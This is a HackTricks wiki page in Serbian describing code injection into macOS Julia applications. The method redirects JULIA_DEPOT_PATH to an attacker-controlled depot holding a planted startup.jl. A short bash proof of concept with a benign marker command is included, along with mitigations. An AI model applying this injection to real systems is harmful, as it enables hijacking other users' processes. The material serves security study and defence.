# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` i `startup.jl`

Julia pri pokretanju obično izvršava `config/startup.jl` iz svog prvog depota. `JULIA_DEPOT_PATH` kontroliše listu depota, tako da njeno usmeravanje na stablo koje napadač može da čita preusmerava automatski učitanu startup datoteku.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Završni separator je koristan kada su žrtvi i dalje potrebni njeni uobičajeni paketi. `julia --startup-file=no` onemogućava ovaj startup file. Obrišite promenljivu pre pokretanja jer ona takođe kontroliše registre paketa, okruženja, keš memorije i lokacije za učitavanje koda.

## References

- [1] [Julia interfejs komandne linije: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia promenljive okruženja: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
